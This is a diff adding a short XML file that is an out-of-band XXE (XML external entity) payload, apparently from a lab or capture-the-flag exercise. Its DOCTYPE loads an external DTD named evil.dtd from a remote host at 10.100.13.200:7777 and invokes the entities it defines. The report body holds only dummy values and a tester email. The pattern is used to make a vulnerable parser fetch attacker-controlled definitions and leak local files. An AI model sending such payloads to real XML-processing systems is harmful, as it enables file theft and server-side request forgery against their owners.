@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE XXE [
+<!ENTITY % remote SYSTEM "http://10.100.13.200:7777/evil.dtd">
+%remote;
+%int;
+%xxe; ]>
+
+<report>
+<date>2020-11-25</date>
+<userinfo>ko ko (testerkokn3t@gmail.com)</userinfo>
+<message>Test</message>
+</report>
